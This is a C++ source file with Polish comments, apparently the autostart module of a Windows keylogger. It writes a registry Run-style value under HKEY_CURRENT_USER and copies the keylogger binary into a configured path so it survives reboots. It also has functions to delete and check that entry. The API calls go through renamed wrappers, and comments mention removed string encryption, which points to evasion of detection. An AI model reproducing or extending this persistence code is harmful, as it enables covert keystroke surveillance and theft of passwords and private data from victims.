/* TODO:
 * + Dodać obsługe innego autostartu gdy nie dodano klucza do rejestru
 */

#include "Autorun.h"


Autorun::Autorun(string keyloggerFileNameIn) {
    this->config = new Config();
    this->keyloggerFileName = keyloggerFileNameIn;
    this->newWinApix = new newWinApi();
}

bool Autorun::addAutostart() {

    HKEY keyHandle;
    LPCTSTR keyDir =  this->config->StringToLPCTSTR(this->config->GetRegKeyDir());

    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0, KEY_ALL_ACCESS, &keyHandle);

    if (result == ERROR_SUCCESS) {
        LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName()); //TU BYL ENCRYPT LPCTSTRTOSTR
        LPCTSTR filePath = this->config->StringToLPCTSTR(this->config->GetRegFilePath());

        LONG setRes = newWinApix->UstawWartoscKluczaRejestru()(keyHandle, keyName, 0, REG_SZ, (LPBYTE) filePath, strlen(filePath) + 1);
        if (setRes == ERROR_SUCCESS) {
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            //succes add key
            return true;
        } else {
            //failed add key
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return false;
        }
    } else {
        //error open key
    }
}

bool Autorun::deleteAutostart() {
    LPCTSTR keyDir = this->config->StringToLPCTSTR(this->config->GetRegKeyDir());
    HKEY keyHandle;

    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0L, KEY_ALL_ACCESS, &keyHandle);

    if (result == ERROR_SUCCESS) {
        LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName()); //TU BYL ENCRYPT LPCTST TO STR
        long delResult = newWinApix->UsunKluczRejestru()(keyHandle, keyName);
        if (delResult == ERROR_SUCCESS) {
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return true;
        }
        newWinApix->ZamknijKluczRejestru()(keyHandle);
    }
    return false;
}

bool Autorun::isActive() {
    LPCTSTR keyDir = this->config->StringToLPCTSTR(this->config->GetRegKeyDir());
    HKEY keyHandle;

    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0, KEY_READ, & keyHandle);

    if (result == ERROR_SUCCESS) {
        LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName()); // encryptStringToLPCTSTR
        LONG key = RegQueryValueExA(keyHandle, keyName, NULL, NULL, NULL, NULL);
        if (key == ERROR_FILE_NOT_FOUND) {
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return false;
        } else {
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return true;
        }
    }
    return false;
}



bool Autorun::CopyFileAutostart() {
    LPCTSTR filePath = this->config->StringToLPCTSTR(this->config->GetRegFilePath());
    return newWinApix->KopiujPlik()(this->getKeyloggerFileName().c_str(), filePath, 0);
}

string Autorun::getKeyloggerFileName() {
    return this->keyloggerFileName;
}

bool Autorun::isCopyFile() {
    Log *log = new Log();
    if (!log->fileExist(this->config->GetRegFilePath())) {
        this->CopyFileAutostart();
        return this->CopyFileAutostart();
    } else {
        return false;
    }
}